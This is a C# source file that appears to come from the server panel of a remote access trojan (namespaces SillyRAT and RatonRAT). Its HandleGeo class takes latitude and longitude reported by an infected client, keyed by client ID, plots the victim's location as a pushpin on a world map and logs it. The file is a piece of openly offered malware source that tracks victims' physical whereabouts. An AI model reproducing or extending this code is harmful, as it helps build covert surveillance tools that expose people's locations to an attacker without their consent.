using System;
using System.Drawing;
using System.Windows.Forms;
using SillyRAT;
using Server.Connection;
using RatonRAT.ClientForms;
using Stuff;
using GMap.NET.WindowsForms;
using GMap.NET.WindowsForms.Markers;
using GMap.NET;
using System.Globalization;

namespace Server.Handlers
{
    internal class HandleGeo
    {
        public HandleGeo(SillyClient SillyClient, Unpack msgUnpack)
        {
            string formName = "Geo | Client ID: ";
            FormGeo geo = (FormGeo)Application.OpenForms[formName + msgUnpack.GetAsString("UID")];

            if (geo != null)
            {
                if (geo.SillyClient == null)
                {
                    geo.SillyClient = SillyClient;
                }
                geo.Invoke(new Action(() =>
                {
                    string latStr = msgUnpack.GetAsString("lat");
                    string lonStr = msgUnpack.GetAsString("lon");
                    double latitude = double.Parse(latStr, CultureInfo.InvariantCulture);
                    double longitude = double.Parse(lonStr, CultureInfo.InvariantCulture);
                    GMapMarker marker = new GMarkerGoogle(new PointLatLng(latitude, longitude), GMarkerGoogleType.red_pushpin);
                    marker.ToolTipText = $"User ID: {msgUnpack.GetAsString("UID")}";
                    Program.form2.Invoke(new Action(() =>
                    {
                        Program.form2.AddMarker(marker);
                        Program.form2.AddLog("Geo location information added to client map", Color.White);
                    }));
                    geo.ShowWorldMap();
                    geo.label3.Visible = false;
                    geo.AddMarker(marker);
                }));
            }
        }
    }
}
